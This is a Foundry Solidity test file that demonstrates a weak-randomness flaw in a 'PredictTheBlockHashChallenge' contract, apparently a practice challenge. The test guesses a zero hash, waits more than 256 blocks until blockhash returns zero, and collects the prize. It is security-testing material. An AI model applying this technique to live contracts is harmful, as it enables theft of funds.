
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PredictTheBlockHashChallenge} from "../src/PredictTheBlockHashChallenge.sol";

contract TestWeakRandomnessPredictTheBlockHashChallenge is Test {

    PredictTheBlockHashChallenge target;

    function setUp() public {
        target = new PredictTheBlockHashChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockNumber) public {
        
        // --- 1. Constraints ---
        vm.assume(blockNumber > 0);
        // Ensure we can roll forward by ~300 blocks without overflow
        vm.assume(blockNumber < type(uint256).max - 300);

        // --- 2. State Configuration ---
        
        vm.deal(address(this), 1 ether);
        
        // Set the environment to the symbolic block number
        vm.roll(blockNumber);

        // --- 3. Replication & Assertion ---
        
        // The vulnerability is that blockhash(N) returns 0 if the current block is 
        // more than 256 blocks newer than N.
        // We predict the result will be bytes32(0) by waiting long enough.
        bytes32 predictedRandomValue = bytes32(0);
        
        // Lock in the guess. The contract records the target block as block.number + 1.
        target.lockInGuess{value: 1 ether}(predictedRandomValue);

        // The target block is now (blockNumber + 1).
        // To force blockhash to return 0, we must be at least 256 blocks past the target block.
        // Target: blockNumber + 1
        // Threshold: (blockNumber + 1) + 256
        // We roll to (blockNumber + 1) + 257.
        uint256 futureBlock = blockNumber + 1 + 257;
        vm.roll(futureBlock);

        uint256 balanceBefore = address(this).balance;

        // Execute the settlement
        target.settle();

        uint256 balanceAfter = address(this).balance;

        // Assert that the contract accepted our prediction of 0 and paid out the reward.
        // We expect to receive 2 ether (our 1 ether back + the contract's 1 ether).
        assertEq(balanceAfter, balanceBefore + 2 ether, "The predictable blockhash(0) did not result in a win");
    }

    receive() external payable {}
}
